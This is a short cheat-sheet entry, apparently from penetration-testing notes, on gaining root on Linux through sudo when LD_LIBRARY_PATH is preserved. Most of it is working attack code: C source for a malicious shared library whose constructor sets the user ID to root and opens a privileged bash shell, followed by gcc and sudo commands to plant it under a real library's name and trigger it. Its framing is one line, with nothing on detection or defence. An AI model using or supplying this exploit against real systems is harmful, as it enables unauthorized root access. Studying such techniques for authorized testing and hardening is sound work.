# sudo LD_LIBRARY_PATH Shared Library Hijack

If `sudo -l` shows a binary runnable as root with `LD_LIBRARY_PATH` preserved (`env_keep`), plant a malicious shared library under the name a library it loads normally.

```c
// hijack.c — runs automatically on load via the constructor attribute
static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

```bash
gcc -o /tmp/<library-name>.so -shared -fPIC hijack.c   # name it after a real lib the target binary loads, e.g. libcrypt.so.1
sudo LD_LIBRARY_PATH=/tmp /path/to/binary <its-normal-args>
```
